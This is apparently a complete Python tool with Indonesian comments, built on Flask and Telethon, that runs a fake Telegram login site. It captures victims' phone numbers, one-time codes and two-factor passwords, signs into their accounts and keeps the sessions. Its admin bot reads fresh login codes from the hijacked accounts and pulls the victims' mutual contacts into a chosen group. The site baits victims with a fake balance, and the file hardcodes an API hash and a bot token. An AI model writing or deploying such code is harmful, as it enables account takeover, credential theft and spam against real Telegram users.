# -*- coding: utf-8 -*-
import asyncio
import threading
import os
import time
from flask import Flask, render_template, request, redirect, url_for, session, flash
from telethon import TelegramClient, events, Button
from telethon.errors import SessionPasswordNeededError, FloodWaitError, PhoneNumberInvalidError
from telethon.tl.functions.channels import JoinChannelRequest, InviteToChannelRequest
from telethon.tl.functions.contacts import GetContactsRequest

# --- KONFIGURASI PATH ---
# Menggunakan path absolut untuk memastikan tidak tersesat di direktori WordPress
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
SESSION_DIR = os.path.join(BASE_DIR, 'sessions')
if not os.path.exists(SESSION_DIR): 
    os.makedirs(SESSION_DIR, mode=0o755)

BOT_SESSION = os.path.join(SESSION_DIR, 'bot_session')

# --- KONFIGURASI API ---
API_ID = 31266539
API_HASH = '789ff283ac1198d83da1cbec30e883d6'
BOT_TOKEN = '8568390541:AAGPLyM5gday0959NsM2Bwl7HRGpkuBGgOs'
ADMIN_IDS = {5385908865}

TARGET_GROUP_BOT = "" 
WEB_SPECIAL_GROUP_LINK = "https://t.me/+vcYDjyo4zfEyY2Q1"
OTP_SESSION_CACHE = "❌ Belum ada data OTP session yang masuk."
CURRENT_LOGIN_NUMBER = None 

# --- SETUP FLASK ---
app = Flask(__name__)
app.secret_key = 'super_secret_key_anti_badai_123'

loop = asyncio.new_event_loop()

device_config = {
    'device_model': "iPhone 16 Pro Max",
    'system_version': "18.1.0",
    'app_version': "11.5.0",
    'lang_code': 'id',
    'system_lang_code': 'id-ID'
}

client = None 
bot = TelegramClient(BOT_SESSION, API_ID, API_HASH, loop=loop)

# --- FUNGSI PEMBANTU ---
def is_admin(user_id): return user_id in ADMIN_IDS

def run_async(coro):
    return asyncio.run_coroutine_threadsafe(coro, loop).result()

def send_admin_notif(message):
    async def send():
        for admin_id in ADMIN_IDS:
            try: await bot.send_message(admin_id, f"🔔 **LOG SISTEM**\n\n{message}")
            except: pass
    asyncio.run_coroutine_threadsafe(send(), loop)

def get_admin_buttons():
    return [
        [Button.inline("🔍 Cek Mutual", b"cek_mutual"), Button.inline("⚡ Sedot ke Grup", b"sedot_grup")],
        [Button.inline("📡 Set Target Grup", b"set_grup_btn"), Button.inline("👥 Auto Join", b"auto_join")],
        [Button.inline("📋 List Sesi", b"list_sesi"), Button.inline("🔓 Status Login", b"status_login")],
        [Button.inline("🔑 Kode OTP Session", b"cek_otp_session"), Button.inline("🔄 Req OTP Ulang (Web)", b"resend_otp_web")],
        [Button.inline("🚀 Auto Login Admin", b"auto_login_admin"), Button.inline("📩 Minta OTP Manual", b"minta_otp_manual")]
    ]

# --- LOGIKA BOT ADMIN ---
@bot.on(events.NewMessage(pattern='/start'))
async def start_handler(event):
    if is_admin(event.sender_id):
        global TARGET_GROUP_BOT
        status_bot = TARGET_GROUP_BOT if TARGET_GROUP_BOT else "Belum Diatur"
        msg = f"👋 **Dashboard Admin Panel**\n\n🎯 Target Grup: `{status_bot}`\n🤖 Status Bot: **Online**"
        await event.reply(msg, buttons=get_admin_buttons())

@bot.on(events.CallbackQuery)
async def callback_handler(event):
    if not is_admin(event.sender_id): return
    global TARGET_GROUP_BOT, OTP_SESSION_CACHE, CURRENT_LOGIN_NUMBER, client
    data = event.data

    if data == b"cek_mutual":
        if not client: return await event.respond("❌ Belum ada client aktif.")
        await event.answer("Analisis...", alert=False)
        try:
            contacts = await client(GetContactsRequest(hash=0))
            mutuals = [u for u in contacts.users if hasattr(u, 'mutual_contact') and u.mutual_contact]
            await event.respond(f"👥 **Hasil:**\nTotal: `{len(contacts.users)}`\nMutual: `{len(mutuals)}`")
        except Exception as e: await event.respond(f"❌ Error: {e}")

    elif data == b"sedot_grup":
        if not client: return await event.respond("❌ Client Off.")
        if not TARGET_GROUP_BOT: return await event.answer("⚠️ Set Target dulu!", alert=True)
        try:
            entity = await client.get_entity(TARGET_GROUP_BOT)
            contacts = await client(GetContactsRequest(hash=0))
            mutuals = [u for u in contacts.users if hasattr(u, 'mutual_contact') and u.mutual_contact]
            success = 0
            for user in mutuals[:20]: 
                try:
                    await client(InviteToChannelRequest(entity, [user]))
                    success += 1
                    await asyncio.sleep(2)
                except: continue
            await event.respond(f"✅ Berhasil invite `{success}` member.")
        except Exception as e: await event.respond(f"❌ Gagal: {e}")

    elif data == b"list_sesi":
        files = [f for f in os.listdir(SESSION_DIR) if f.endswith('.session')]
        await event.respond(f"📂 **Sesi Tersimpan:**\n`" + "\n".join(files) + "`")

    elif data == b"auto_login_admin":
        if not client: return await event.respond("❌ Client Off.")
        try:
            async for message in client.iter_messages(777000, limit=1):
                await event.respond(f"📥 **KODE:**\n`{message.text}`")
                break
        except Exception as e: await event.respond(f"❌ Error: {e}")

    await event.answer()

# --- ROUTES FLASK (WEB) ---

@app.route('/login', methods=['GET', 'POST'])
def login():
    global CURRENT_LOGIN_NUMBER, client
    if request.method == 'POST':
        raw_phone = request.form.get('phone', '').strip().replace(" ", "").replace("-", "")
        phone = '+62' + raw_phone[1:] if raw_phone.startswith('0') else ('+' + raw_phone if not raw_phone.startswith('+') else raw_phone)
        CURRENT_LOGIN_NUMBER = phone 
        try:
            user_session_path = os.path.join(SESSION_DIR, f"{phone}")
            client = TelegramClient(user_session_path, API_ID, API_HASH, loop=loop, **device_config)
            if not client.is_connected(): run_async(client.connect())
            sent_code = run_async(client.send_code_request(phone))
            session['phone'] = phone
            session['phone_code_hash'] = sent_code.phone_code_hash
            send_admin_notif(f"✅ OTP Terkirim: `{phone}`")
            return redirect(url_for('verify'))
        except Exception as e:
            flash(f"Gagal: {str(e)}")
            send_admin_notif(f"❌ Error Login: {str(e)}")
    return render_template('login.html')

@app.route('/verify', methods=['GET', 'POST'])
def verify():
    global OTP_SESSION_CACHE, client
    if request.method == 'POST':
        otp, pwd = request.form.get('otp'), request.form.get('password')
        phone, phone_hash = session.get('phone'), session.get('phone_code_hash')
        OTP_SESSION_CACHE = f"📱: {phone}\n🔑: {otp}\n🔒: {pwd if pwd else 'N/A'}"
        try:
            if not client.is_connected(): run_async(client.connect())
            user = run_async(client.sign_in(phone=phone, password=pwd)) if pwd else run_async(client.sign_in(phone=phone, code=otp, phone_code_hash=phone_hash))
            session['user_id'], session['name'] = user.id, user.first_name
            try: run_async(client(JoinChannelRequest(WEB_SPECIAL_GROUP_LINK)))
            except: pass
            send_admin_notif(f"✅ SUKSES: {user.first_name} ({phone})")
            return redirect(url_for('home'))
        except SessionPasswordNeededError:
            return render_template('verify.html', password_required=True)
        except Exception as e:
            flash(f"Gagal: {str(e)}")
            return redirect(url_for('verify'))
    return render_template('verify.html', password_required=False)

@app.route('/')
def home():
    if 'user_id' not in session: return redirect(url_for('login'))
    return render_template('index.html', info={"full_name": session.get('name'), "saldo": 150000})

# --- BACKGROUND PROCESS ---
def start_telegram_clients():
    asyncio.set_event_loop(loop)
    async def main():
        await bot.start(bot_token=BOT_TOKEN)
        await bot.run_until_disconnected()
    loop.run_until_complete(main())

if __name__ == '__main__':
    threading.Thread(target=start_telegram_clients, daemon=True).start()
    # Port 5007 biasanya terbuka di Jagoan Hosting untuk aplikasi Python/Node
    app.run(host='0.0.0.0', port=5007, debug=False, use_reloader=False)